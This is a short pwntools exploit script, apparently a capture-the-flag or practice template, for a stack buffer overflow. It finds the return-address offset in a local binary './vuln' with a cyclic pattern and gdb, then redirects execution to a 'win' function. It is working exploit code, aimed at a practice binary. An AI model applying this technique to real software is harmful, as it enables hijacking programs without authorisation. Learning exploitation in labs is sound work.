from pwn import *

#Storing the necessary information before starting the exploit.
binary = "./vuln"
target_function = 'win'
prompt_question = b"what is your name"
elf = ELF(binary);

#Start of the first process, to find the offset
process_offset=process(binary)
print(f"""\n\nOpen another tmux pane or another terminal, and attach this process using the following command\ngdb -q {binary} -p {process_offset.pid}""")
print("Now execute continue command on the gdb and come back here and press Enter")
pause() #This pause gives the time to switch to the other tmux pane or terminal and attach the process

#This helps us to find the offset of return address from the address of the buffer variable
padding = cyclic(100)
if prompt_question != b"" :
	process_offset.recvuntil(prompt_question) 
process_offset.sendline(padding)

#This process ensures we're copying the stored address, Here input is used instead of pause as the process is already killed by segmentation fault.
print("\n\nNow, copy the address stored in rsp from the gdb terminal by executing the following command \nx/gx $rsp\nThen detach from the gdb session by executing\ndetach")
input("Press Enter after you copy the pattern and detaching from gdb ")
process_offset.close()

#Here, we're calculating the offset using the copied address
rip_val = input("\nPaste overwritten RIP (hex, like 0x6161616e6161616d): ").strip()
offset = cyclic_find(p64(int(rip_val,16), n=8))
print(f"\nCalculated offset:{offset}")
win = elf.symbols[target_function]
payload = b'A' * offset + p64(win)

#Here, we're opening another process to run the exploit.
process_exploit = process(binary)
if prompt_question != b"" :
	process_exploit.recvuntil(prompt_question)
process_exploit.sendline(payload)
process_exploit.interactive()



